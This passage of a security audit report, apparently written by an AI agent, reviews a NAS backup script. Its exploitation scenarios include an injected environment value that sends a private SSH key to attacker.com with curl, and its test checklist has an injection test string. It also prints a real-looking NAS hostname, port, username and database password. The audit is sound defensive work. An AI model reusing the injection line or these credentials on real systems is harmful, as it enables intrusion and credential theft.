TIMESTAMP=$(TZ=Europe/Berlin date +%Y%m%d_%H%M%S)
BACKUP_NAME="backup-${TIMESTAMP}"

# Line 312: Predictable NAS path
local remote_path="${SYNOLOGY_BASE_PATH}/${RETENTION_TIER}/${DATE_YEAR}/${DATE_MONTH}/${DATE_DAY}/${DATE_HOUR}${DATE_MINUTE:-00}"

# Results in paths like:
# /volume1/homes/FSAdmin/Backup/Server AskProAI/daily/2025/11/04/1100/backup-20251104_110000.tar.gz
```

**Problem**: Backup filenames and paths are completely predictable:
- Timestamp-based naming (no randomness)
- Hierarchical directory structure (year/month/day/hour)
- Known schedule (03:00, 11:00, 19:00 CET)

**Exploitation Scenario**:
```bash
# Attacker reconnaissance (via email notification or logs)
# Learns backup naming pattern: backup-YYYYMMDD_HHMMSS.tar.gz

# Attacker knows backup schedule: 03:00, 11:00, 19:00 CET
# Current time: 2025-11-04 18:55 CET
# Next backup predicted: 2025-11-04 19:00 CET

# Attacker prepares attack:
# 1. Wait until 19:00:30 (backup in progress)
# 2. Predict exact backup filename: backup-20251104_190000.tar.gz
# 3. Predict exact NAS path: daily/2025/11/04/1900/backup-20251104_190000.tar.gz
# 4. Exploit CRIT-002 (MITM) or CRIT-001 (command injection)
# 5. Intercept or replace backup file (exact path known)

# Attacker can also:
# - Enumerate all backups by iterating dates
# - Download specific backups (e.g., "give me all backups from October")
# - Verify file existence without triggering anomaly detection
```

**Impact**:
- Facilitates targeted attacks (attacker knows exact filenames)
- Enables backup enumeration
- Timing attacks (attacker knows when backups occur)
- Reduces attack surface uncertainty

**Fix Required**:
```bash
# Add random component to backup naming
TIMESTAMP=$(TZ=Europe/Berlin date +%Y%m%d_%H%M%S)
RANDOM_SUFFIX=$(openssl rand -hex 8)  # 16-character random hex
BACKUP_NAME="backup-${TIMESTAMP}-${RANDOM_SUFFIX}"

# Result: backup-20251104_110000-7f3a2d1e4c5b6a8f.tar.gz
# Still sortable by timestamp, but not predictable

# Alternatively: Use UUID
BACKUP_UUID=$(uuidgen)
BACKUP_NAME="backup-${TIMESTAMP}-${BACKUP_UUID}"

# Result: backup-20251104_110000-550e8400-e29b-41d4-a716-446655440000.tar.gz

# Update NAS path to include random component
local remote_path="${SYNOLOGY_BASE_PATH}/${RETENTION_TIER}/${DATE_YEAR}/${DATE_MONTH}/${BACKUP_NAME}"

# Trade-off: Slightly less organized, but much more secure
```

---

### MED-006: No Integrity Verification of Uploaded Backup
**Severity**: MEDIUM (CVSS 5.5)
**Lines**: 338-351
**CWE**: CWE-353 (Missing Support for Integrity Check)

**Vulnerability**:
```bash
# Lines 338-351: Checksum verification of .tmp file only
local local_sha=$(awk '{print $1}' "${FINAL_ARCHIVE}.sha256")
local remote_sha=$(ssh ... "sha256sum '${remote_tmp}'" | awk '{print $1}')

if [ "$local_sha" != "$remote_sha" ]; then
    log "❌ Checksum mismatch!"
    return 2
fi

# Then move to final location (no re-verification)
ssh ... "mv '${remote_tmp}' '${remote_final}'" || {
```

**Problem**: Checksum is verified for temporary file, but **not re-verified after atomic move**. This leaves two windows for integrity compromise:
1. Between verification and move (TOCTOU - see HIGH-004)
2. After move (no verification that final file is intact)

**Attack Scenario**:
```bash
# Scenario 1: Race condition exploitation (see HIGH-004)
# Attacker replaces .tmp file after checksum verification

# Scenario 2: NAS filesystem corruption
# Filesystem error occurs during mv operation
# File moved but corrupted due to I/O error
# No re-verification, corrupt backup considered successful

# Scenario 3: Silent data corruption
# NAS experiences bit rot / silent data corruption
# File passes initial checksum, then corrupts during mv
# Next restore fails catastrophically
```

**Impact**:
- Backup integrity not guaranteed
- Silent backup corruption
- False success reports
- Catastrophic restore failure

**Fix Required**:
```bash
# Re-verify checksum after atomic move
ssh ... "mv '${remote_tmp}' '${remote_final}'" || {
    log "❌ Failed to finalize upload"
    return 1
}

# CRITICAL: Re-verify checksum of FINAL file
log "🔍 Verifying final backup integrity..."
local final_sha=$(ssh -i "$SYNOLOGY_SSH_KEY" \
    -o StrictHostKeyChecking=no \
    -p "$SYNOLOGY_PORT" \
    "${SYNOLOGY_USER}@${SYNOLOGY_HOST}" \
    "sha256sum '${remote_final}'" | awk '{print $1}')

if [ "$local_sha" != "$final_sha" ]; then
    log "❌ CRITICAL: Final checksum mismatch! Upload compromised!"
    log "   Expected: $local_sha"
    log "   Got:      $final_sha"

    # Delete suspicious file
    ssh ... "rm '${remote_final}'"

    # Alert administrators
    send_alert "CRITICAL: Backup integrity verification failed" "critical"

    return 3
fi

log "   ✅ Final backup integrity verified"
```

---

### MED-007: Email Contains Full Error Log (Potential Information Disclosure)
**Severity**: MEDIUM (CVSS 5.2)
**Lines**: send-backup-notification.sh:263-267, 340-342
**CWE**: CWE-209 (Generation of Error Message Containing Sensitive Information)

**Vulnerability**:
```bash
# send-backup-notification.sh lines 263-267
# Get last 200 lines of error log
local error_tail=""
if [ -f "$ERROR_LOG" ]; then
    error_tail=$(tail -200 "$ERROR_LOG" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')
fi

# Lines 340-342: Included in email body
<div class="section">
  <h2>📜 Log Tail (Last 200 Lines)</h2>
  <div class="log-tail">${error_tail}</div>
</div>
```

**Problem**: Error emails contain last 200 lines of logs, which may include:
- Database connection strings
- File paths
- System topology
- Error stack traces with code snippets
- Credentials in error messages
- IP addresses and hostnames

**Example Error Log Content**:
```bash
[2025-11-04 11:00:15] mysqldump: [Warning] Using a password on the command line interface can be insecure.
[2025-11-04 11:00:16] mysqldump: Got error: 2002: Can't connect to MySQL server on '127.0.0.1' (115) when trying to connect
[2025-11-04 11:00:17] SSH command: ssh -i /root/.ssh/synology_backup_key -p 50222 AskProAI@fs-cloud1977.synology.me "mkdir -p '/volume1/homes/FSAdmin/Backup/Server AskProAI/daily/2025/11/04/1100'"
[2025-11-04 11:00:20] tar: /var/www/api-gateway/.env: Cannot open: Permission denied
[2025-11-04 11:00:25] curl: Failed to connect to ifconfig.me port 443: Connection timed out
```

**Information Disclosed**:
- MySQL connection details (host, port)
- SSH command with full paths and credentials
- File system structure
- NAS topology
- Network connectivity issues

**Exploitation Scenario**:
```bash
# Attacker compromises email account
# Downloads failure notification email
# Extracts sensitive information from log tail:

# From logs:
SSH key location: /root/.ssh/synology_backup_key
NAS hostname: fs-cloud1977.synology.me
SSH port: 50222
Username: AskProAI
NAS path: /volume1/homes/FSAdmin/Backup/Server AskProAI/
Application path: /var/www/api-gateway/
.env file location: /var/www/api-gateway/.env

# Attacker now has complete reconnaissance data
```

**Impact**:
- Complete system topology disclosure
- Credential and path exposure
- Facilitates targeted attacks
- Email compromise = full reconnaissance

**Fix Required**:
```bash
# Implement log sanitization before email
sanitize_log() {
    local log_content="$1"

    # Remove sensitive patterns
    echo "$log_content" | sed -E \
        's|/root/[^ ]+|/root/***|g' \
        's|ssh -i [^ ]+|ssh -i ***|g' \
        's|password[=:][^ ]+|password=***|g' \
        's|[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+|***@***|g' \
        's|/volume1/[^ ]+|/volume1/***|g' \
        's|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|***.***.***.***|g' \
        's|port [0-9]+|port ***|g'
}

# Apply sanitization before email
local error_tail=""
if [ -f "$ERROR_LOG" ]; then
    error_tail=$(tail -200 "$ERROR_LOG" | sanitize_log | \
                  sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')
fi

# Alternatively: Only include last 50 lines (not 200)
error_tail=$(tail -50 "$ERROR_LOG" | sanitize_log | ...)
```

---

## 📋 RECOMMENDATIONS (Best Practices)

### REC-001: Implement Backup Encryption at Rest
**Priority**: HIGH
**Lines**: 254-275

**Current**: Backups stored in plaintext on local disk and NAS
**Recommendation**: Encrypt all backups before writing to disk

**Implementation**:
```bash
# Use GPG encryption with backup@askproai.de public key
tar -czf - -C "$WORK_DIR" . | \
    gpg --encrypt --recipient backup@askproai.de \
    --output "$FINAL_ARCHIVE"

# Or use age encryption (modern alternative)
tar -czf - -C "$WORK_DIR" . | \
    age -r age1abcd... -o "$FINAL_ARCHIVE.age"
```

**Benefits**:
- Defense-in-depth (encryption at rest + in transit)
- GDPR/PCI-DSS compliance
- Protects against insider threats
- Secures backup even if NAS is compromised

---

### REC-002: Implement Backup Restore Testing
**Priority**: HIGH
**Lines**: N/A (missing feature)

**Current**: No automated restore testing
**Recommendation**: Implement quarterly restore tests

**Implementation**:
```bash
# Create restore test script
#!/bin/bash
# /var/www/api-gateway/scripts/backup-restore-test.sh

# 1. Download random backup from NAS
RANDOM_BACKUP=$(ssh ... "ls -1 ${SYNOLOGY_BASE_PATH}/daily/*/*/*/*.tar.gz | shuf -n 1")

# 2. Extract to isolated environment
TEST_DIR="/tmp/restore-test-$(date +%s)"
mkdir -p "$TEST_DIR"
scp ... "$RANDOM_BACKUP" "$TEST_DIR/"

# 3. Verify integrity
cd "$TEST_DIR"
tar -tzf backup-*.tar.gz > /dev/null 2>&1 || {
    echo "FAIL: Archive corrupted"
    exit 1
}

# 4. Verify .env exists
tar -xzf backup-*.tar.gz application.tar.gz
tar -tzf application.tar.gz | grep -q "^\.env$" || {
    echo "FAIL: .env missing from backup"
    exit 1
}

# 5. Verify database dump
zcat database.sql.gz | head -100 | grep -q "^CREATE TABLE" || {
    echo "FAIL: Database dump corrupted"
    exit 1
}

echo "SUCCESS: Restore test passed"
```

**Add to crontab**:
```bash
# Run restore test every 3 months (1st day of quarter at 02:00)
0 2 1 1,4,7,10 * /var/www/api-gateway/scripts/backup-restore-test.sh
```

---

### REC-003: Implement Backup Versioning and Retention Automation
**Priority**: MEDIUM
**Lines**: 474-475 (manual cleanup)

**Current**: Manual cleanup with `find | sort | tail | xargs rm`
**Recommendation**: Implement proper retention policy with audit trail

**Implementation**:
```bash
# Enhanced retention cleanup
backup_retention_cleanup() {
    log "🧹 Running retention cleanup..."

    # Local backups: Keep last 3
    local local_backups=$(find "$BACKUP_BASE" -maxdepth 1 -name "backup-*.tar.gz" -type f | sort -r)
    local local_count=$(echo "$local_backups" | wc -l)

    if [ "$local_count" -gt 3 ]; then
        local to_delete=$(echo "$local_backups" | tail -n +4)
        echo "$to_delete" | while read backup; do
            log "   Deleting old local backup: $(basename $backup)"
            rm -f "$backup" "${backup}.sha256"
        done
    fi

    # NAS retention: Daily (14 days), Biweekly (6 months)
    ssh ... "
        # Delete daily backups older than 14 days
        find '${SYNOLOGY_BASE_PATH}/daily' -type f -name '*.tar.gz' -mtime +14 -delete

        # Delete biweekly backups older than 180 days
        find '${SYNOLOGY_BASE_PATH}/biweekly' -type f -name '*.tar.gz' -mtime +180 -delete
    "

    log "   ✅ Retention cleanup complete"
}
```

---

### REC-004: Add Backup Monitoring and Alerting
**Priority**: MEDIUM
**Lines**: N/A (missing feature)

**Current**: Email notifications only
**Recommendation**: Implement comprehensive monitoring

**Implementation**:
```bash
# Prometheus metrics endpoint
# /var/www/api-gateway/public/metrics/backup.prom

# HELP backup_last_success_timestamp Unix timestamp of last successful backup
# TYPE backup_last_success_timestamp gauge
backup_last_success_timestamp{tier="daily"} 1730714400

# HELP backup_duration_seconds Duration of last backup in seconds
# TYPE backup_duration_seconds gauge
backup_duration_seconds{tier="daily"} 180

# HELP backup_size_bytes Size of last backup in bytes
# TYPE backup_size_bytes gauge
backup_size_bytes{tier="daily",component="database"} 257163264
backup_size_bytes{tier="daily",component="application"} 471859200
backup_size_bytes{tier="daily",component="system"} 102400

# HELP backup_failures_total Total number of backup failures
# TYPE backup_failures_total counter
backup_failures_total{tier="daily"} 0
```

**Alerting Rules** (Prometheus):
```yaml
groups:
  - name: backup_alerts
    rules:
      - alert: BackupFailure
        expr: time() - backup_last_success_timestamp > 86400  # 24 hours
        for: 1h
        annotations:
          summary: "Backup has not succeeded in 24+ hours"

      - alert: BackupSizeAnomaly
        expr: |
          abs((backup_size_bytes - avg_over_time(backup_size_bytes[7d]))
              / avg_over_time(backup_size_bytes[7d])) > 0.3
        for: 1h
        annotations:
          summary: "Backup size deviated >30% from 7-day average"
```

---

### REC-005: Implement Secure Credential Storage with systemd Credentials
**Priority**: HIGH
**Lines**: 125-132 (mysqldump), 28 (SSH key)

**Current**: Credentials in `/root/.my.cnf` and `/root/.ssh/`
**Recommendation**: Use systemd credentials for secret management

**Implementation**:
```bash
# 1. Store secrets in systemd credentials
echo "askproai_secure_pass_2024" > /etc/secrets/db_password
chmod 400 /etc/secrets/db_password

# 2. Create systemd service
# /etc/systemd/system/backup.service
[Unit]
Description=AskPro AI Backup Service
Wants=network-online.target
After=network-online.target mariadb.service

[Service]
Type=oneshot
User=root
LoadCredential=db_password:/etc/secrets/db_password
LoadCredential=ssh_key:/root/.ssh/synology_backup_key
Environment=MYSQL_PWD=%d/db_password
ExecStart=/var/www/api-gateway/scripts/backup-run.sh
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target

# 3. Create systemd timer
# /etc/systemd/system/backup.timer
[Unit]
Description=AskPro AI Backup Timer (3x daily)

[Timer]
OnCalendar=*-*-* 03:00:00 Europe/Berlin
OnCalendar=*-*-* 11:00:00 Europe/Berlin
OnCalendar=*-*-* 19:00:00 Europe/Berlin
Persistent=true

[Install]
WantedBy=timers.target

# 4. Enable timer
systemctl daemon-reload
systemctl enable --now backup.timer
```

**Benefits**:
- Credentials not in filesystem (systemd manages)
- Automatic credential rotation support
- Audit trail of credential access
- Credential encryption at rest

---

### REC-006: Implement Audit Logging for Security Events
**Priority**: MEDIUM
**Lines**: 65 (log function)

**Current**: Basic logging to `/var/log/backup-run.log`
**Recommendation**: Structured audit logging

**Implementation**:
```bash
# Enhanced audit logging
audit_log() {
    local event_type="$1"  # BACKUP_START, BACKUP_SUCCESS, BACKUP_FAIL, SECURITY_EVENT
    local event_data="$2"
    local severity="${3:-INFO}"  # INFO, WARN, ERROR, CRITICAL

    # Structured JSON log
    local audit_entry=$(cat <<EOF
{
  "timestamp": "$(date -Iseconds)",
  "event_type": "$event_type",
  "severity": "$severity",
  "hostname": "$(hostname)",
  "script": "backup-run.sh",
  "user": "$(whoami)",
  "data": $event_data
}
EOF
)

    # Write to audit log (separate from main log)
    echo "$audit_entry" >> /var/log/backup-audit.log

    # Also send to syslog for SIEM integration
    logger -t backup-audit -p local0.$severity "$audit_entry"
}

# Usage examples:
audit_log "BACKUP_START" '{"tier":"daily","timestamp":"'$TIMESTAMP'"}' "INFO"
audit_log "SSH_CONNECTION" '{"host":"'$SYNOLOGY_HOST'","port":'$SYNOLOGY_PORT'}' "INFO"
audit_log "SIZE_ANOMALY" '{"deviation":'$deviation',"size":'$current_size'}' "WARN"
audit_log "CHECKSUM_MISMATCH" '{"local":"'$local_sha'","remote":"'$remote_sha'"}' "CRITICAL"
```

---

### REC-007: Add SSH Connection Hardening
**Priority**: HIGH
**Lines**: 101-112, 315-368

**Current**: Basic SSH with disabled host key checking
**Recommendation**: Comprehensive SSH hardening

**Implementation**:
```bash
# SSH connection wrapper with hardening
secure_ssh() {
    local command="$1"

    ssh -i "$SYNOLOGY_SSH_KEY" \
        -o StrictHostKeyChecking=yes \        # ← FIX: Enable host key checking
        -o UserKnownHostsFile=/root/.ssh/known_hosts_synology \
        -o PasswordAuthentication=no \
        -o PubkeyAuthentication=yes \
        -o ConnectTimeout=30 \
        -o ServerAliveInterval=10 \
        -o ServerAliveCountMax=3 \
        -o Compression=yes \
        -o LogLevel=ERROR \
        -o BatchMode=yes \
        -p "$SYNOLOGY_PORT" \
        "${SYNOLOGY_USER}@${SYNOLOGY_HOST}" \
        "$command"
}

# Usage:
secure_ssh "mkdir -p '${remote_path}'"
secure_ssh "sha256sum '${remote_tmp}'"

# Initial setup (one-time):
ssh-keyscan -p "$SYNOLOGY_PORT" "$SYNOLOGY_HOST" > /root/.ssh/known_hosts_synology
```

---

## Exploitation Scenarios Summary

### Scenario 1: Complete System Compromise via SSH Command Injection
**Attack Chain**:
1. Attacker gains limited access to server (e.g., www-data user)
2. Attacker modifies cron environment or exploits script invocation
3. Sets `SYNOLOGY_BASE_PATH="/volume1/backup\"; curl http://attacker.com/$(cat /root/.ssh/synology_backup_key | base64); echo \""`
4. Backup script executes with malicious environment
5. SSH command injection exfiltrates private SSH key
6. Attacker gains direct NAS access
7. Attacker downloads all historical backups (contains .env with all credentials)
8. Attacker achieves complete system compromise

**Affected Vulnerabilities**: CRIT-001, CRIT-002, CRIT-004, HIGH-002

---

### Scenario 2: Man-in-the-Middle Backup Interception
**Attack Chain**:
1. Attacker performs ARP spoofing or DNS hijacking on network
2. Redirects traffic for `fs-cloud1977.synology.me` to attacker host
3. Backup script connects (no host key verification due to CRIT-002)
4. Attacker intercepts full backup stream (450MB+ with sensitive data)
5. Attacker extracts .env, database dump, and system configuration
6. Attacker achieves persistent access via stolen credentials
7. Backup completes successfully (attacker forwards to real NAS)
8. No detection - logs show "successful backup"

**Affected Vulnerabilities**: CRIT-002, CRIT-004, HIGH-005

---

### Scenario 3: Local Privilege Escalation via Backup Access
**Attack Chain**:
1. Attacker exploits web application vulnerability (SQL injection, RCE)
2. Gains www-data shell access
3. Discovers backups in `/var/backups/askproai` (world-readable, HIGH-002)
4. Copies recent backup: `cp /var/backups/askproai/backup-latest.tar.gz /tmp/`
5. Extracts: `tar -xzf backup-latest.tar.gz`
6. Reads: `tar -xzf application.tar.gz .env`
7. Obtains `DB_PASSWORD`, `APP_KEY`, `AWS_SECRET_ACCESS_KEY`
8. Achieves full database access, user impersonation, and cloud infrastructure access
9. Establishes persistent backdoor

**Affected Vulnerabilities**: CRIT-004, HIGH-002, HIGH-003, HIGH-005

---

## Compliance Impact

### GDPR (General Data Protection Regulation)
**Violations**:
- **Art. 32(1)**: Lack of encryption at rest (CRIT-004, HIGH-005)
- **Art. 32(2)**: Inadequate confidentiality measures (CRIT-002, HIGH-002)
- **Art. 32(4)**: No regular security testing (REC-002)
- **Art. 33**: Delayed breach detection (MED-003, no monitoring)

**Penalties**: Up to €20 million or 4% of annual global turnover

---

### PCI-DSS (Payment Card Industry Data Security Standard)
**Violations**:
- **Req. 3.4**: Encryption not rendered unreadable (CRIT-004, HIGH-005)
- **Req. 8.2**: Inadequate credential management (CRIT-003)
- **Req. 10.2**: Insufficient audit logging (REC-006)
- **Req. 12.10**: No incident response procedures for backups

**Impact**: Loss of payment card processing privileges

---

### ISO 27001 (Information Security Management)
**Violations**:
- **A.9.4.1**: Inadequate access controls (HIGH-002)
- **A.10.1.1**: Lack of encryption policy (CRIT-004, HIGH-005)
- **A.12.3.1**: No backup restore testing (REC-002)
- **A.18.1.3**: Inadequate protection of records (CRIT-004)

---

## Priority Action Plan

### Immediate (Within 24 Hours) - CRITICAL
1. **FIX CRIT-001**: Implement SSH command sanitization (lines 315-368)
2. **FIX CRIT-002**: Re-enable SSH host key verification, add known_hosts entry
3. **FIX HIGH-002**: Change backup directory permissions to 700, owner to root
4. **FIX HIGH-003**: Secure log file permissions (600), implement log rotation

**Commands**:
```bash
# Immediate fixes
chmod 700 /var/backups/askproai
chown -R root:root /var/backups/askproai
chmod 600 /var/backups/askproai/*.tar.gz
chmod 600 /var/log/backup-run.log
ssh-keyscan -p 50222 fs-cloud1977.synology.me >> /root/.ssh/known_hosts
```

---

### Short-Term (Within 1 Week) - HIGH
1. **FIX CRIT-004**: Implement GPG encryption for .env and full backups
2. **FIX HIGH-001**: Sanitize paths in email notifications
3. **FIX HIGH-004**: Add checksum re-verification after atomic move
4. **FIX HIGH-005**: Implement full backup encryption before upload
5. **IMPL REC-005**: Migrate to systemd credentials

---

### Medium-Term (Within 1 Month) - MEDIUM
1. **FIX MED-001 to MED-007**: Address all medium-risk vulnerabilities
2. **IMPL REC-002**: Setup quarterly restore testing
3. **IMPL REC-004**: Implement backup monitoring with Prometheus
4. **IMPL REC-006**: Implement audit logging for security events

---

### Long-Term (Within 3 Months) - RECOMMENDATIONS
1. **IMPL REC-001**: Full backup encryption architecture
2. **IMPL REC-003**: Automated retention management
3. **IMPL REC-007**: Comprehensive SSH hardening
4. Regular security audits and penetration testing

---

## Testing Recommendations

### Security Testing Checklist
```bash
# Test 1: Command injection resistance
export SYNOLOGY_BASE_PATH="/volume1/backup'; echo INJECTED; echo '"
/var/www/api-gateway/scripts/backup-run.sh
# Expected: Sanitization prevents injection

# Test 2: Host key verification
ssh-keygen -R fs-cloud1977.synology.me  # Remove known host
/var/www/api-gateway/scripts/backup-run.sh
# Expected: Failure with "Host key verification failed"

# Test 3: File permissions
ls -la /var/backups/askproai
# Expected: drwx------ root root (700)

# Test 4: Log sanitization
grep -i "password\|secret\|key" /var/log/backup-run.log
# Expected: No sensitive data exposed

# Test 5: Backup encryption
file /var/backups/askproai/backup-*.tar.gz
# Expected: "GPG encrypted data" (not "gzip compressed")

# Test 6: Restore test
/var/www/api-gateway/scripts/backup-restore-test.sh
# Expected: SUCCESS message
```

---

## Conclusion

The backup script contains **critical security vulnerabilities** that could lead to **complete system compromise**. The most severe issues are:

1. **SSH command injection** (CRIT-001) - RCE on NAS
2. **Disabled host key verification** (CRIT-002) - MITM attacks
3. **Unencrypted .env in backups** (CRIT-004) - Credential exposure
4. **Inadequate file permissions** (HIGH-002) - Local privilege escalation

**Immediate action is required** to address critical vulnerabilities before the next backup cycle.

**Overall Security Posture**: 🔴 **CRITICAL RISK**

**Recommended Actions**:
1. Implement all IMMEDIATE fixes within 24 hours
2. Deploy SHORT-TERM fixes within 1 week
3. Schedule MEDIUM-TERM improvements within 1 month
4. Plan LONG-TERM architectural changes within 3 months

**Post-Fix Verification**:
- Run security testing checklist
- Perform penetration testing
- Conduct restore testing
- Review audit logs for anomalies

---

**Audit Completed**: 2025-11-04
**Next Audit Recommended**: After fixes implemented + 3 months
**Auditor**: Security Audit Agent (Claude Code)
